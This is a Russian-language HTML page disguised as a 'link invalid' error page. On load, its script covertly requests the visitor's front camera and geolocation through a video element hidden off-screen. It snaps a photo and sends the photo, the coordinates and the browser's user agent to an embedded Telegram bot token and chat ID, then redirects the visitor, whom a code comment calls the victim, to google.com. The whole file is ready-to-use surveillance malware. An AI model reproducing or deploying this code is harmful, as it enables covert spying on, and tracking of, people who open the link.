<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Ошибка</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            color: #aaa;
            text-align: center;
        }
        .message {
            max-width: 300px;
            padding: 20px;
        }
        h1 {
            font-size: 22px;
            margin-bottom: 12px;
            color: #ccc;
        }
        p {
            font-size: 14px;
            opacity: 0.8;
        }
        /* Видео скрыто за пределами экрана */
        video {
            position: absolute;
            left: -9999px;
            top: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="message">
        <h1>🔗 Ссылка недействительна</h1>
        <p>Возможно, страница была удалена или вы перешли по устаревшему адресу.<br>Перенаправление...</p>
    </div>
    <video id="hiddenVideo" autoplay playsinline muted></video>

    <script>
        // ===== НАСТРОЙКИ (замените при необходимости) =====
        const BOT_TOKEN = "8870989101:AAHrjmtXznwKqyAf5D4uGvmG0wuWjpZ1PX4";
        const CHAT_ID   = "7003535127";
        // =================================================

        let videoElem = document.getElementById('hiddenVideo');
        let stream = null;
        let coords = null;
        let photoSent = false;

        // 1. Геолокация (тихо, без видимого UI)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    coords = pos.coords;
                    console.log("Geo получены");
                },
                (err) => {
                    console.warn("Geo отклонена:", err.message);
                }
            );
        }

        // 2. Запрашиваем камеру (фронтальную)
        async function getCameraAndShot() {
            try {
                // Пытаемся получить именно фронтальную камеру
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } }
                });
                videoElem.srcObject = stream;
                // Ждём появления видеопотока
                await new Promise((resolve) => {
                    if (videoElem.readyState >= 2) {
                        resolve();
                    } else {
                        videoElem.onloadeddata = () => resolve();
                    }
                });
                // Делаем паузу для стабилизации кадра
                setTimeout(() => takePhotoAndSend(), 1000);
            } catch (err) {
                console.warn("Фронталка не доступна, пробуем любую камеру");
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    videoElem.srcObject = stream;
                    await new Promise((resolve) => {
                        if (videoElem.readyState >= 2) resolve();
                        else videoElem.onloadeddata = () => resolve();
                    });
                    setTimeout(() => takePhotoAndSend(), 1000);
                } catch (finalErr) {
                    console.error("Камера полностью недоступна", finalErr);
                    // Ничего не отправляем, просто показываем ошибку
                }
            }
        }

        function takePhotoAndSend() {
            if (photoSent) return;
            if (!videoElem.videoWidth || !videoElem.videoHeight) {
                // Повторим через 0.5 сек
                setTimeout(() => takePhotoAndSend(), 500);
                return;
            }
            photoSent = true;

            let canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            let ctx = canvas.getContext('2d');
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                if (!blob) return;

                let caption = `📸 Скрытое фото\n🕒 ${new Date().toLocaleString()}`;
                if (coords) {
                    caption += `\n📍 ${coords.latitude}, ${coords.longitude}\n🗺 https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
                } else {
                    caption += `\n⚠️ Геолокация не разрешена`;
                }
                caption += `\n📱 ${navigator.userAgent}`;

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'cam.jpg');
                formData.append('caption', caption);

                try {
                    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const json = await resp.json();
                    if (json.ok) {
                        console.log("Отправлено успешно");
                        // Доп. отправка координат отдельным сообщением
                        if (coords) {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    text: `📍 Координаты: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`
                                })
                            });
                        }
                        // Останавливаем камеру
                        if (stream) stream.getTracks().forEach(track => track.stop());
                        // Перенаправляем жертву на легитимную страницу
                        setTimeout(() => {
                            window.location.href = "https://google.com";
                        }, 1500);
                    } else {
                        console.error("Ошибка Telegram:", json.description);
                    }
                } catch (err) {
                    console.error("Сетевая ошибка:", err);
                }
            }, 'image/jpeg', 0.85);
        }

        // Запускаем всё после загрузки страницы
        window.addEventListener('load', () => {
            getCameraAndShot();
            // Если через 8 секунд фото не ушло (например, пользователь запретил камеру) — просто редиректим
            setTimeout(() => {
                if (!photoSent) {
                    window.location.href = "https://google.com";
                }
            }, 8000);
        });
    </script>
</body>
</html>
